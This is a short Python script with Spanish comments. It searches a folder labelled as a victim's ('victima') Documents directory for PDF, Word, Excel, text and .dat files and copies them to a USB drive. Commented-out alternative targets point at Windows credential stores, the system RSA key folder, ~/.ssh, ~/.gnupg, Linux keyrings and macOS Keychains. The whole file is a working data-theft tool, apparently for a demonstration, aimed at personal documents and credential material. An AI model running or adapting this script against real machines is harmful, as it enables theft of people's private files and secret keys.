import os
import shutil

# Ruta que representa el dispositivo USB (ajustar según el sistema)
USB_PATH = "D:\\prueba"  # Cambia esto por la letra real en tu sistema
TARGET_EXTENSIONS = ['.dat', '.DAT', '.pdf', '.docx', '.xlsx', '.txt' ]
SEARCH_PATH = "C:\\Users\\victima\\Documents"   # Directorio objetivo

# Directorio de windows donde pueden haber claves en hash
# SEARCH_PATH = "c:\Users\<NombreDeLaVictima>\AppData\Local\Microsoft\Credentials"  
# SEARCH_PATH = "c:\Users\<NombreDeLaVictima>\AppData\Roaming\Microsoft\Credentials"  
# SEARCH_PATH = "C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Windows\Crypto\RSA"

# Ficheros de linux y mac donde pueden haber claves en hash  
# SEARCH_PATH = "~/.local/share/keyrings/"  
# SEARCH_PATH = "~/.ssh/"  
# SEARCH_PATH = "~/.gnupg/"  
# SEARCH_PATH = "~/Library/Keychains/" 

# En la siguiente funcion se muestra un codigo para identificar los diferentes archivo
def buscar_archivos(ruta, extensiones):
    archivos_encontrados = []
    for root, dirs, files in os.walk(ruta):
        for file in files:
            if any(file.lower().endswith(ext) for ext in extensiones):
                archivos_encontrados.append(os.path.join(root, file))
    return archivos_encontrados

# Con el siguiente codigo se copia los archivos a la ruta de la USB
def copiar_a_usb(archivos, destino_usb):
    if not os.path.exists(destino_usb):
        print(f"[!] USB no encontrada en {destino_usb}")
        return

    for archivo in archivos:
        try:
            shutil.copy2(archivo, destino_usb)
            print(f"[+] Copiado: {archivo}")
        except Exception as e:
            print(f"[!] Error copiando {archivo}: {e}")

# En el siguiente main se muestra como se ejecutan las funciones
if __name__ == "__main__":
    print("Los archivos se estan buscando...")
    archivos = buscar_archivos(SEARCH_PATH, TARGET_EXTENSIONS)
    print(f"Los archivos que se encontraron son los siguientes: {len(archivos)}")

    print("Se procede a copiar en la USB")
    copiar_a_usb(archivos, USB_PATH)
    print("Proceso completado.")